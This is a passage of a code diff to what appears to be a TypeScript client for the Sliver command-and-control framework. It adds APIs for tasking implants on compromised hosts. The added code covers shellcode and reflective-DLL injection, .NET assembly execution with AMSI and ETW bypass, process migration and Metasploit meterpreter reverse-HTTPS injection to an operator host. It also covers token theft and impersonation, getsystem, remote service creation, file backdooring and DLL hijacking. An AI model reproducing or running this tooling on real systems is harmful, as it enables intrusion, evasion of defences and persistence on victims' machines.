@@ -17,7 +17,7 @@ import {
   rpcTlsAuthorityOverride,
   type RpcMessageDomain,
 } from "./messageBudget";
-import { BeaconTask } from "./pb/clientpb/client";
+import { BeaconTask, ShellcodeEncoder } from "./pb/clientpb/client";
 import type {
   BeaconTasks,
   Event,
@@ -58,6 +58,13 @@ const gzip = promisify(gzipCb);
 const gunzip = promisify(gunzipCb);
 
 const DEFAULT_TIMEOUT_SECONDS = 30;
+const M4_DEFAULT_TIMEOUT_SECONDS = 60;
+const M4_IDENTITY_TIMEOUT_SECONDS = 30;
+const M4_SECRET_MAX_PAYLOAD_BYTES = 1024 * 1024;
+const M4_REMOTE_HOSTNAME_MAX_CHARACTERS = 255;
+const M4_REMOTE_SERVICE_NAME_MAX_CHARACTERS = 256;
+const M4_REMOTE_SERVICE_DESCRIPTION_MAX_CHARACTERS = 4_096;
+const M4_REMOTE_COMMAND_LINE_MAX_CHARACTERS = 32_767;
 const EVENT_RETRY_INITIAL_MS = 500;
 const EVENT_RETRY_MAX_MS = 10_000;
 
@@ -126,6 +133,143 @@ export type SessionRegistryWriteValue =
   | { type: "string"; value: string }
   | { type: "dword"; value: number }
   | { type: "qword"; value: string };
+
+export interface ExecuteOptions {
+  path: string;
+  args?: string[];
+  output?: boolean;
+  background?: boolean;
+  stdoutPath?: string;
+  stderrPath?: string;
+  envInheritance?: boolean;
+  env?: Readonly<Record<string, string>>;
+  useToken?: boolean;
+  hideWindow?: boolean;
+  parentPid?: number;
+}
+
+export interface ExecuteAssemblyOptions {
+  arguments?: string[];
+  process?: string;
+  isDll?: boolean;
+  arch?: string;
+  className?: string;
+  method?: string;
+  appDomain?: string;
+  parentPid?: number;
+  processArgs?: string[];
+  inProcess?: boolean;
+  runtime?: string;
+  amsiBypass?: boolean;
+  etwBypass?: boolean;
+}
+
+export interface ExecuteShellcodeOptions {
+  pid?: number;
+  rwxPages?: boolean;
+}
+
+export interface SideloadOptions {
+  processName?: string;
+  args?: string[];
+  entryPoint?: string;
+  keepAlive?: boolean;
+  isDll?: boolean;
+  isUnicode?: boolean;
+  parentPid?: number;
+  processArgs?: string[];
+}
+
+export interface SpawnDllOptions {
+  processName?: string;
+  args?: string[];
+  entryPoint?: string;
+  keepAlive?: boolean;
+}
+
+export interface MigrateOptions {
+  pid?: number;
+  processName?: string;
+  config: ImplantConfig;
+  encoder?: ShellcodeEncoder;
+  name: string;
+}
+
+export interface MsfOptions {
+  payload?: string;
+  lhost: string;
+  lport?: number;
+  encoder?: string;
+  iterations?: number;
+}
+
+export interface MsfRemoteOptions extends MsfOptions {
+  pid: number;
+}
+
+export interface SshCommandOptions {
+  username: string;
+  hostname: string;
+  port?: number;
+  command?: string | string[];
+  password?: string;
+  privateKey?: Buffer;
+  kerberosConfigPath?: string;
+  kerberosKeytab?: Buffer;
+  kerberosRealm?: string;
+}
+
+export interface StartRemoteServiceOptions {
+  hostname: string;
+  serviceName: string;
+  serviceDescription: string;
+  binaryPath: string;
+  args?: string;
+}
+
+export interface RemoveRemoteServiceOptions {
+  hostname: string;
+  serviceName: string;
+}
+
+export interface RunAsOptions {
+  username: string;
+  processName: string;
+  args?: string;
+  domain?: string;
+  password?: string;
+  showWindow?: boolean;
+  netOnly?: boolean;
+}
+
+export type WindowsLogonType = 2 | 3 | 4 | 5 | 7 | 8 | 9;
+
+export interface MakeTokenOptions {
+  username: string;
+  password: string;
+  domain?: string;
+  logonType?: WindowsLogonType;
+}
+
+export interface GetSystemOptions {
+  config: ImplantConfig;
+  hostingProcess?: string;
+}
+
+export interface BackdoorOptions {
+  filePath: string;
+  profileName?: string;
+  name?: string;
+}
+
+export interface HijackDllOptions {
+  referenceDllPath: string;
+  targetLocation: string;
+  referenceDll?: Buffer;
+  targetDll?: Buffer;
+  profileName?: string;
+  name?: string;
+}
 
 export interface Tunnel {
   readonly id: string;
@@ -626,6 +770,16 @@ export class SliverClient {
     };
   }
 
+  private m4SessionRequest(sessionId: string, timeoutSeconds: number): CommonRequest {
+    assertNonEmptyString(sessionId, "Session id");
+    return this.sessionRequest(sessionId, timeoutSeconds);
+  }
+
+  private m4BeaconRequest(beaconId: string, timeoutSeconds: number): CommonRequest {
+    assertNonEmptyString(beaconId, "Beacon id");
+    return this.beaconRequest(beaconId, timeoutSeconds);
+  }
+
   get isConnected(): boolean {
     return this.rpcClients.control !== undefined;
   }
@@ -852,10 +1006,19 @@ export class SliverClient {
 
   // --- Explicit M2 session workbench APIs ---
 
-  currentTokenOwnerSession(sessionId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+  currentTokenOwnerSession(sessionId: string, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
     return withTimeoutSignal(timeoutSeconds, (signal) =>
       this.rpc.currentTokenOwner(
-        { Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { Request: this.m4SessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  currentTokenOwnerBeacon(beaconId: string, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.currentTokenOwner(
+        { Request: this.m4BeaconRequest(beaconId, timeoutSeconds) },
         { signal },
       ),
     );
@@ -1376,6 +1539,718 @@ export class SliverClient {
         { signal },
       ),
     );
+  }
+
+  // --- Explicit M4 execution and privilege APIs ---
+
+  private executeTarget(request: CommonRequest, options: ExecuteOptions, timeoutSeconds: number) {
+    assertNonEmptyString(options.path, "Executable path");
+    const args = m4StringArray(options.args);
+    const background = options.background ?? false;
+    const output = !background && (options.output ?? true);
+    const stdout = options.stdoutPath ?? "";
+    const stderr = options.stderrPath ?? "";
+    const parentPid = boundedUint32(options.parentPid ?? 0, "Parent process id");
+    const useToken = options.useToken ?? false;
+    const hideWindow = options.hideWindow ?? false;
+    const windowsRequest = useToken || hideWindow || parentPid !== 0;
+
+    if (windowsRequest) {
+      if (options.envInheritance || Object.keys(options.env ?? {}).length > 0) {
+        throw new Error("Environment options cannot be combined with Windows execution modifiers");
+      }
+      return withTimeoutSignal(timeoutSeconds, (signal) =>
+        this.rpc.executeWindows(
+          {
+            Path: options.path,
+            Args: args,
+            Output: output,
+            Stdout: stdout,
+            Stderr: stderr,
+            UseToken: useToken,
+            HideWindow: hideWindow,
+            Background: background,
+            PPid: parentPid,
+            Request: request,
+          },
+          { signal },
+        ),
+      );
+    }
+
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.execute(
+        {
+          Path: options.path,
+          Args: args,
+          Output: output,
+          Stdout: stdout,
+          Stderr: stderr,
+          EnvInheritance: options.envInheritance ?? false,
+          Env: m4Environment(options.env),
+          Background: background,
+          PPid: 0,
+          Request: request,
+        },
+        { signal },
+      ),
+    );
+  }
+
+  executeSession(
+    sessionId: string,
+    options: ExecuteOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.executeTarget(this.m4SessionRequest(sessionId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  executeBeacon(
+    beaconId: string,
+    options: ExecuteOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.executeTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  executeChildrenSession(sessionId: string, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.executeChildren(
+        { Request: this.m4SessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  executeChildrenBeacon(beaconId: string, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.executeChildren(
+        { Request: this.m4BeaconRequest(beaconId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  private executeAssemblyTarget(
+    request: CommonRequest,
+    assembly: Buffer,
+    options: ExecuteAssemblyOptions,
+    timeoutSeconds: number,
+  ) {
+    const isDll = options.isDll ?? false;
+    if (isDll && (!options.className?.trim() || !options.method?.trim())) {
+      throw new Error("DLL assembly execution requires a class name and method");
+    }
+    if (!options.inProcess && (options.runtime || options.amsiBypass || options.etwBypass)) {
+      throw new Error("Runtime, AMSI bypass, and ETW bypass require in-process assembly execution");
+    }
+
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      const ownedAssembly = m4ArtifactCopy(assembly, "Assembly");
+      try {
+        return await this.artifactRpc.executeAssembly(
+          {
+            Assembly: ownedAssembly,
+            Arguments: m4StringArray(options.arguments),
+            Process: options.process ?? "notepad.exe",
+            IsDLL: isDll,
+            Arch: options.arch ?? "x84",
+            ClassName: options.className ?? "",
+            Method: options.method ?? "",
+            AppDomain: options.appDomain ?? "",
+            PPid: boundedUint32(options.parentPid ?? 0, "Parent process id"),
+            ProcessArgs: options.processArgs === undefined ? [""] : m4StringArray(options.processArgs),
+            InProcess: options.inProcess ?? false,
+            Runtime: options.runtime ?? "",
+            AmsiBypass: options.amsiBypass ?? false,
+            EtwBypass: options.etwBypass ?? false,
+            Request: request,
+          },
+          { signal },
+        );
+      } finally {
+        ownedAssembly.fill(0);
+      }
+    });
+  }
+
+  executeAssemblySession(
+    sessionId: string,
+    assembly: Buffer,
+    options: ExecuteAssemblyOptions = {},
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.executeAssemblyTarget(
+      this.m4SessionRequest(sessionId, timeoutSeconds),
+      assembly,
+      options,
+      timeoutSeconds,
+    );
+  }
+
+  executeAssemblyBeacon(
+    beaconId: string,
+    assembly: Buffer,
+    options: ExecuteAssemblyOptions = {},
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.executeAssemblyTarget(
+      this.m4BeaconRequest(beaconId, timeoutSeconds),
+      assembly,
+      options,
+      timeoutSeconds,
+    );
+  }
+
+  private executeShellcodeTarget(
+    request: CommonRequest,
+    shellcode: Buffer,
+    options: ExecuteShellcodeOptions,
+    timeoutSeconds: number,
+  ) {
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      const ownedShellcode = m4ArtifactCopy(shellcode, "Shellcode");
+      try {
+        return await this.artifactRpc.task(
+          {
+            Encoder: "",
+            RWXPages: options.rwxPages ?? false,
+            Pid: boundedUint32(options.pid ?? 0, "Shellcode process id"),
+            Data: ownedShellcode,
+            Request: request,
+          },
+          { signal },
+        );
+      } finally {
+        ownedShellcode.fill(0);
+      }
+    });
+  }
+
+  executeShellcodeSession(
+    sessionId: string,
+    shellcode: Buffer,
+    options: ExecuteShellcodeOptions = {},
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.executeShellcodeTarget(
+      this.m4SessionRequest(sessionId, timeoutSeconds),
+      shellcode,
+      options,
+      timeoutSeconds,
+    );
+  }
+
+  executeShellcodeBeacon(
+    beaconId: string,
+    shellcode: Buffer,
+    options: ExecuteShellcodeOptions = {},
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.executeShellcodeTarget(
+      this.m4BeaconRequest(beaconId, timeoutSeconds),
+      shellcode,
+      options,
+      timeoutSeconds,
+    );
+  }
+
+  private sideloadTarget(
+    request: CommonRequest,
+    data: Buffer,
+    options: SideloadOptions,
+    timeoutSeconds: number,
+  ) {
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      const ownedData = m4ArtifactCopy(data, "Sideload library");
+      try {
+        return await this.artifactRpc.sideload(
+          {
+            Data: ownedData,
+            ProcessName: options.processName ?? "c:\\windows\\system32\\notepad.exe",
+            Args: m4StringArray(options.args),
+            EntryPoint: options.entryPoint ?? "",
+            Kill: !(options.keepAlive ?? false),
+            isDLL: options.isDll ?? false,
+            isUnicode: options.isUnicode ?? false,
+            PPid: boundedUint32(options.parentPid ?? 0, "Parent process id"),
+            ProcessArgs: options.processArgs === undefined ? [""] : m4StringArray(options.processArgs),
+            Request: request,
+          },
+          { signal },
+        );
+      } finally {
+        ownedData.fill(0);
+      }
+    });
+  }
+
+  sideloadSession(
+    sessionId: string,
+    data: Buffer,
+    options: SideloadOptions = {},
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.sideloadTarget(this.m4SessionRequest(sessionId, timeoutSeconds), data, options, timeoutSeconds);
+  }
+
+  sideloadBeacon(
+    beaconId: string,
+    data: Buffer,
+    options: SideloadOptions = {},
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.sideloadTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), data, options, timeoutSeconds);
+  }
+
+  private spawnDllTarget(
+    request: CommonRequest,
+    data: Buffer,
+    options: SpawnDllOptions,
+    timeoutSeconds: number,
+  ) {
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      const ownedData = m4ArtifactCopy(data, "Reflective DLL");
+      try {
+        return await this.artifactRpc.spawnDll(
+          {
+            Data: ownedData,
+            ProcessName: options.processName ?? "c:\\windows\\system32\\notepad.exe",
+            Args: m4StringArray(options.args),
+            EntryPoint: options.entryPoint ?? "ReflectiveLoader",
+            Kill: !(options.keepAlive ?? false),
+            PPid: 0,
+            ProcessArgs: [],
+            Request: request,
+          },
+          { signal },
+        );
+      } finally {
+        ownedData.fill(0);
+      }
+    });
+  }
+
+  spawnDllSession(
+    sessionId: string,
+    data: Buffer,
+    options: SpawnDllOptions = {},
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.spawnDllTarget(this.m4SessionRequest(sessionId, timeoutSeconds), data, options, timeoutSeconds);
+  }
+
+  spawnDllBeacon(
+    beaconId: string,
+    data: Buffer,
+    options: SpawnDllOptions = {},
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.spawnDllTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), data, options, timeoutSeconds);
+  }
+
+  getShellcodeEncoderMap(timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.shellcodeEncoderMap({}, { signal }));
+  }
+
+  private migrateTarget(request: CommonRequest, options: MigrateOptions, timeoutSeconds: number) {
+    const pid = boundedUint32(options.pid ?? 0, "Migration process id");
+    const processName = options.processName?.trim() ?? "";
+    if (pid === 0 && processName === "") {
+      throw new Error("Migration requires either a process id or process name");
+    }
+    const config = m4ImplantConfig(options.config);
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.migrate(
+        {
+          Pid: pid,
+          Config: config,
+          Encoder: options.encoder ?? ShellcodeEncoder.NONE,
+          Name: options.name,
+          ProcName: processName,
+          Request: request,
+        },
+        { signal },
+      ),
+    );
+  }
+
+  migrateSession(
+    sessionId: string,
+    options: MigrateOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.migrateTarget(this.m4SessionRequest(sessionId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  migrateBeacon(
+    beaconId: string,
+    options: MigrateOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.migrateTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  private msfTarget(request: CommonRequest, options: MsfOptions, timeoutSeconds: number) {
+    assertNonEmptyString(options.lhost, "Metasploit listen host");
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.msf(
+        {
+          Payload: options.payload ?? "meterpreter_reverse_https",
+          LHost: options.lhost,
+          LPort: boundedPort(options.lport ?? 4444, "Metasploit listen port"),
+          Encoder: options.encoder ?? "",
+          Iterations: boundedInt32(options.iterations ?? 1, "Metasploit encoder iterations"),
+          Request: request,
+        },
+        { signal },
+      ),
+    );
+  }
+
+  msfSession(sessionId: string, options: MsfOptions, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
+    return this.msfTarget(this.m4SessionRequest(sessionId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  msfBeacon(beaconId: string, options: MsfOptions, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
+    return this.msfTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  private msfRemoteTarget(request: CommonRequest, options: MsfRemoteOptions, timeoutSeconds: number) {
+    assertNonEmptyString(options.lhost, "Metasploit listen host");
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.msfRemote(
+        {
+          Payload: options.payload ?? "meterpreter_reverse_https",
+          LHost: options.lhost,
+          LPort: boundedPort(options.lport ?? 4444, "Metasploit listen port"),
+          Encoder: options.encoder ?? "",
+          Iterations: boundedInt32(options.iterations ?? 1, "Metasploit encoder iterations"),
+          PID: boundedUint32(options.pid, "Metasploit injection process id"),
+          Request: request,
+        },
+        { signal },
+      ),
+    );
+  }
+
+  msfRemoteSession(
+    sessionId: string,
+    options: MsfRemoteOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.msfRemoteTarget(this.m4SessionRequest(sessionId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  msfRemoteBeacon(
+    beaconId: string,
+    options: MsfRemoteOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.msfRemoteTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  runSshSession(
+    sessionId: string,
+    options: SshCommandOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    assertNonEmptyString(options.username, "SSH username");
+    assertNonEmptyString(options.hostname, "SSH hostname");
+    if (options.kerberosRealm && !options.kerberosKeytab) {
+      throw new Error("A Kerberos realm requires a keytab");
+    }
+
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      const ownedPrivateKey = m4SecretCopy(options.privateKey, "SSH private key");
+      const ownedKeytab = m4SecretCopy(options.kerberosKeytab, "Kerberos keytab");
+      try {
+        return await this.rpc.runSSHCommand(
+          {
+            Username: options.username,
+            Hostname: options.hostname,
+            Port: boundedPort(options.port ?? 22, "SSH port"),
+            Command: Array.isArray(options.command) ? options.command.join(" ") : (options.command ?? ""),
+            Password: options.password ?? "",
+            PrivKey: ownedPrivateKey,
+            Krb5Conf: options.kerberosConfigPath ?? "/etc/krb5.conf",
+            Keytab: ownedKeytab,
+            Realm: options.kerberosRealm ?? "",
+            Request: this.m4SessionRequest(sessionId, timeoutSeconds),
+          },
+          { signal },
+        );
+      } finally {
+        ownedPrivateKey.fill(0);
+        ownedKeytab.fill(0);
+      }
+    });
+  }
+
+  startRemoteServiceSession(
+    sessionId: string,
+    options: StartRemoteServiceOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    assertBoundedNonEmptyString(
+      options.hostname,
+      "Remote service hostname",
+      M4_REMOTE_HOSTNAME_MAX_CHARACTERS,
+    );
+    assertBoundedNonEmptyString(
+      options.serviceName,
+      "Remote service name",
+      M4_REMOTE_SERVICE_NAME_MAX_CHARACTERS,
+    );
+    assertBoundedNonEmptyString(
+      options.serviceDescription,
+      "Remote service description",
+      M4_REMOTE_SERVICE_DESCRIPTION_MAX_CHARACTERS,
+    );
+    assertBoundedNonEmptyString(
+      options.binaryPath,
+      "Remote service binary path",
+      M4_REMOTE_COMMAND_LINE_MAX_CHARACTERS,
+    );
+    assertBoundedString(
+      options.args ?? "",
+      "Remote service arguments",
+      M4_REMOTE_COMMAND_LINE_MAX_CHARACTERS,
+    );
+
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.startService(
+        {
+          ServiceName: options.serviceName,
+          ServiceDescription: options.serviceDescription,
+          BinPath: options.binaryPath,
+          Hostname: options.hostname,
+          Arguments: options.args ?? "",
+          Request: this.m4SessionRequest(sessionId, timeoutSeconds),
+        },
+        { signal },
+      ),
+    );
+  }
+
+  removeRemoteServiceSession(
+    sessionId: string,
+    options: RemoveRemoteServiceOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    assertBoundedNonEmptyString(
+      options.hostname,
+      "Remote service hostname",
+      M4_REMOTE_HOSTNAME_MAX_CHARACTERS,
+    );
+    assertBoundedNonEmptyString(
+      options.serviceName,
+      "Remote service name",
+      M4_REMOTE_SERVICE_NAME_MAX_CHARACTERS,
+    );
+
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.removeService(
+        {
+          ServiceInfo: {
+            Hostname: options.hostname,
+            ServiceName: options.serviceName,
+          },
+          Request: this.m4SessionRequest(sessionId, timeoutSeconds),
+        },
+        { signal },
+      ),
+    );
+  }
+
+  private runAsTarget(request: CommonRequest, options: RunAsOptions, timeoutSeconds: number) {
+    assertNonEmptyString(options.username, "Run-as username");
+    assertNonEmptyString(options.processName, "Run-as process path");
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.runAs(
+        {
+          Username: options.username,
+          ProcessName: options.processName,
+          Args: options.args ?? "",
+          Domain: options.domain ?? "",
+          Password: options.password ?? "",
+          HideWindow: !(options.showWindow ?? false),
+          NetOnly: options.netOnly ?? false,
+          Request: request,
+        },
+        { signal },
+      ),
+    );
+  }
+
+  runAsSession(
+    sessionId: string,
+    options: RunAsOptions,
+    timeoutSeconds = M4_IDENTITY_TIMEOUT_SECONDS,
+  ) {
+    return this.runAsTarget(this.m4SessionRequest(sessionId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  runAsBeacon(
+    beaconId: string,
+    options: RunAsOptions,
+    timeoutSeconds = M4_IDENTITY_TIMEOUT_SECONDS,
+  ) {
+    return this.runAsTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  private makeTokenTarget(request: CommonRequest, options: MakeTokenOptions, timeoutSeconds: number) {
+    assertNonEmptyString(options.username, "Token username");
+    assertNonEmptyString(options.password, "Token password");
+    const logonType = options.logonType ?? 9;
+    if (!isWindowsLogonType(logonType)) throw new Error("Unsupported Windows logon type");
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.makeToken(
+        {
+          Username: options.username,
+          Password: options.password,
+          Domain: options.domain ?? "",
+          LogonType: logonType,
+          Request: request,
+        },
+        { signal },
+      ),
+    );
+  }
+
+  makeTokenSession(
+    sessionId: string,
+    options: MakeTokenOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.makeTokenTarget(this.m4SessionRequest(sessionId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  makeTokenBeacon(
+    beaconId: string,
+    options: MakeTokenOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.makeTokenTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  private impersonateTarget(request: CommonRequest, username: string, timeoutSeconds: number) {
+    assertNonEmptyString(username, "Impersonation username");
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.impersonate({ Username: username, Request: request }, { signal }),
+    );
+  }
+
+  impersonateSession(
+    sessionId: string,
+    username: string,
+    timeoutSeconds = M4_IDENTITY_TIMEOUT_SECONDS,
+  ) {
+    return this.impersonateTarget(this.m4SessionRequest(sessionId, timeoutSeconds), username, timeoutSeconds);
+  }
+
+  impersonateBeacon(
+    beaconId: string,
+    username: string,
+    timeoutSeconds = M4_IDENTITY_TIMEOUT_SECONDS,
+  ) {
+    return this.impersonateTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), username, timeoutSeconds);
+  }
+
+  revToSelfSession(sessionId: string, timeoutSeconds = M4_IDENTITY_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.revToSelf({ Request: this.m4SessionRequest(sessionId, timeoutSeconds) }, { signal }),
+    );
+  }
+
+  revToSelfBeacon(beaconId: string, timeoutSeconds = M4_IDENTITY_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.revToSelf({ Request: this.m4BeaconRequest(beaconId, timeoutSeconds) }, { signal }),
+    );
+  }
+
+  getSystemSession(
+    sessionId: string,
+    options: GetSystemOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    const config = m4ImplantConfig(options.config);
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.getSystem(
+        {
+          HostingProcess: options.hostingProcess ?? "spoolsv.exe",
+          Config: config,
+          Name: "",
+          Request: this.m4SessionRequest(sessionId, timeoutSeconds),
+        },
+        { signal },
+      ),
+    );
+  }
+
+  getPrivsSession(sessionId: string, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.getPrivs({ Request: this.m4SessionRequest(sessionId, timeoutSeconds) }, { signal }),
+    );
+  }
+
+  getPrivsBeacon(beaconId: string, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.getPrivs({ Request: this.m4BeaconRequest(beaconId, timeoutSeconds) }, { signal }),
+    );
+  }
+
+  backdoorSession(
+    sessionId: string,
+    options: BackdoorOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    assertNonEmptyString(options.filePath, "Backdoor remote file path");
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.backdoor(
+        {
+          FilePath: options.filePath,
+          ProfileName: options.profileName ?? "",
+          Name: options.name ?? "",
+          Request: this.m4SessionRequest(sessionId, timeoutSeconds),
+        },
+        { signal },
+      ),
+    );
+  }
+
+  hijackDllSession(
+    sessionId: string,
+    options: HijackDllOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    assertNonEmptyString(options.referenceDllPath, "Reference DLL path");
+    assertNonEmptyString(options.targetLocation, "DLL target location");
+    if (options.targetDll && options.profileName) {
+      throw new Error("DLL hijack accepts either target DLL bytes or a profile, not both");
+    }
+
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      const ownedReferenceDll = m4ArtifactCopy(options.referenceDll, "Reference DLL");
+      const ownedTargetDll = m4ArtifactCopy(options.targetDll, "Target DLL");
+      try {
+        return await this.artifactRpc.hijackDLL(
+          {
+            ReferenceDLLPath: options.referenceDllPath,
+            TargetLocation: options.targetLocation,
+            ReferenceDLL: ownedReferenceDll,
+            TargetDLL: ownedTargetDll,
+            ProfileName: options.profileName ?? "",
+            Name: options.name ?? "",
+            Request: this.m4SessionRequest(sessionId, timeoutSeconds),
+          },
+          { signal },
+        );
+      } finally {
+        ownedReferenceDll.fill(0);
+        ownedTargetDll.fill(0);
+      }
+    });
   }
 
   killSession(sessionId: string, force = false, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Empty> {
@@ -1962,6 +2837,89 @@ export class SliverClient {
 
 function assertNonEmptyString(value: string, label: string): void {
   if (typeof value !== "string" || !value.trim()) throw new Error(`${label} must not be empty`);
+}
+
+function assertBoundedString(value: string, label: string, maxCharacters: number): void {
+  if (typeof value !== "string") throw new Error(`${label} must be a string`);
+  if (value.length > maxCharacters) {
+    throw new Error(`${label} must not exceed ${maxCharacters} characters`);
+  }
+}
+
+function assertBoundedNonEmptyString(value: string, label: string, maxCharacters: number): void {
+  assertNonEmptyString(value, label);
+  assertBoundedString(value, label, maxCharacters);
+}
+
+function boundedUint32(value: number, label: string): number {
+  if (!Number.isSafeInteger(value) || value < 0 || value > 0xffff_ffff) {
+    throw new Error(`${label} must be an unsigned 32-bit integer`);
+  }
+  return value;
+}
+
+function boundedInt32(value: number, label: string): number {
+  if (!Number.isSafeInteger(value) || value < 0 || value > 0x7fff_ffff) {
+    throw new Error(`${label} must be a non-negative 32-bit integer`);
+  }
+  return value;
+}
+
+function boundedPort(value: number, label: string): number {
+  if (!Number.isSafeInteger(value) || value < 1 || value > 65_535) {
+    throw new Error(`${label} must be between 1 and 65535`);
+  }
+  return value;
+}
+
+function m4StringArray(values: string[] | undefined): string[] {
+  if (values === undefined) return [];
+  if (!Array.isArray(values) || values.some((value) => typeof value !== "string")) {
+    throw new Error("Arguments must be an array of strings");
+  }
+  return [...values];
+}
+
+function m4Environment(env: Readonly<Record<string, string>> | undefined): Record<string, string> {
+  if (env === undefined) return {};
+  const result: Record<string, string> = {};
+  for (const [name, value] of Object.entries(env)) {
+    assertNonEmptyString(name, "Environment variable name");
+    if (typeof value !== "string") throw new Error("Environment variable values must be strings");
+    result[name] = value;
+  }
+  return result;
+}
+
+function m4ArtifactCopy(data: Buffer | undefined, label: string): Buffer {
+  if (data === undefined) return Buffer.alloc(0);
+  if (!Buffer.isBuffer(data)) throw new Error(`${label} must be bytes`);
+  assertBoundedArtifact(data, label);
+  return Buffer.from(data);
+}
+
+function m4SecretCopy(data: Buffer | undefined, label: string): Buffer {
+  if (data === undefined) return Buffer.alloc(0);
+  if (!Buffer.isBuffer(data)) throw new Error(`${label} must be bytes`);
+  if (data.length > M4_SECRET_MAX_PAYLOAD_BYTES) {
+    throw new Error(`${label} exceeds the ${M4_SECRET_MAX_PAYLOAD_BYTES}-byte secret limit`);
+  }
+  return Buffer.from(data);
+}
+
+function m4ImplantConfig(config: ImplantConfig): ImplantConfig {
+  if (!config || typeof config !== "object") throw new Error("Implant configuration is required");
+  return {
+    ...config,
+    C2: config.C2.map((c2) => ({ ...c2 })),
